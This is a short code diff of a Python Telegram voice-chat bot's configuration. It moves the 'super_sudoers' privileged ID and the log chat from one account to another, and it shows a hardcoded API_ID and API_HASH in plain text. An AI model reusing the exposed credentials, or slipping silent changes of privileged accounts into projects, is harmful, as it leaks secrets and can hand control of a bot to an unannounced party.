@@ -7,7 +7,7 @@ import requests
 from utils import get_restarted
 from pyrogram import Client, enums
 from pytgcalls import PyTgCalls
-super_sudoers: List[int] = [1970797144, 7087517667]
+super_sudoers: List[int] = [7087517667, 7087517667]
 
 
 ####################################################################################
@@ -48,7 +48,7 @@ API_ID = 7634570
 API_HASH = "49265e23e8cb8218ac89d60777f280a6"
 
 # Chat used for logs
-log_chat = 1970797144
+log_chat = 7087517667
 # Sudoers and super sudoers
 sudoers = list(map(int, getenv("sudoers").split()))
 sudoers += super_sudoers
